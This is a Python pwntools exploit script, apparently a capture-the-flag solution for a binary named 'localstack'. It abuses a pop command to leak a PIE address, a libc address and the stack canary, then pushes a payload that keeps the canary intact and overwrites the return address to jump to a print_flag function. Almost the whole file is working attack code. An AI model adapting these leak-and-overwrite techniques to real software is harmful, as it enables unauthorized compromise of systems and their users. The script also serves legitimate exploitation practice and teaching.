#!/usr/bin/env python3
# Local Ubuntu 24.04

from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = "./localstack"
elf  = ELF(BINARY, checksec=False)

def Connect():
  if len(sys.argv) > 1 and sys.argv[1] == 'r':
    HOST = "172.31.1.2"
    PORT = 11100
    s = remote(HOST, PORT)
  else:
    s = process(BINARY)
  return s

def Pop():
  s.sendlineafter(b">> ", b"pop")
  s.recvuntil(b"Popped ") 
  b = int(s.recvuntil(b" ")[:-1])
  if b < 0:
    b += 0x10000000000000000
  return b
  
def Push(data):
  s.sendlineafter(b">> ", b"push "+str(data).encode())  

def Exit():
  s.sendlineafter(b">> ", b"exit")
 
s = Connect()

Pop()
Pop()
pie_leak = Pop()
pie_base = pie_leak - 0x149f
print("pie_leak  =", hex(pie_leak))
print("pie_base  =", hex(pie_base))

for i in range(5):
  Pop()
libc_leak = Pop()
libc_base = libc_leak - (0x7ffff7c85bc4-0x7ffff7c00000)
print("libc_leak =", hex(libc_leak))
print("libc_base =", hex(libc_base))

for i in range(29):
  Pop()
canary = Pop()
print("canary    =", hex(canary))  

for i in range(67):
  Push(0)
Push(canary)
Push(0)
Push(pie_base + elf.sym.print_flag)

Exit()


s.interactive() 
